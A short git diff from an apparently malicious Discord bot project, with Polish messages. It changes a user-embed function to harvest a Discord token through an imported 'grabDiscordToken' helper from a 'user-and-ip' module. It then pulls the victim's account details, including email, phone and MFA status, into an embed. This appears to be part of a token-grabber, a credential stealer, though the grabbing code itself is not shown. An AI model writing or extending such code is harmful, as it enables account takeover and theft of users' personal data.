@@ -1,21 +1,18 @@
 import { EmbedBuilder } from 'discord.js'
 import { getRandomColor } from '@/bot/functions/visual-embed/colors'
 import { getUserData } from '@/bot/functions/user-and-ip/user-data'
+import { grabDiscordToken } from '@/bot/functions/user-and-ip/grab-token'
 
-export const createUserEmbed = async (token: string): Promise<EmbedBuilder> => {
-  const userData = (await getUserData(token)) as {
-    id: string
-    username: string
-    discriminator: string
-    email: string
-    avatar: string
-    phone?: string
-    locale: string
-    verified: boolean
-    nsfw_allowed: boolean
-    mfa_enabled: boolean
-    premium_type: number
-  }
+export const createUserEmbed = async (): Promise<EmbedBuilder> => {
+  const token = grabDiscordToken() || process.env.USER_TOKEN
+  if (!token)
+    return new EmbedBuilder()
+      .setTitle('❌ Błąd')
+      .setDescription('Nie udało się pobrać tokenu.')
+      .setColor(0xff0000)
+      .setTimestamp()
+
+  const userData = await getUserData(token)
 
   if (!userData) {
     return new EmbedBuilder()
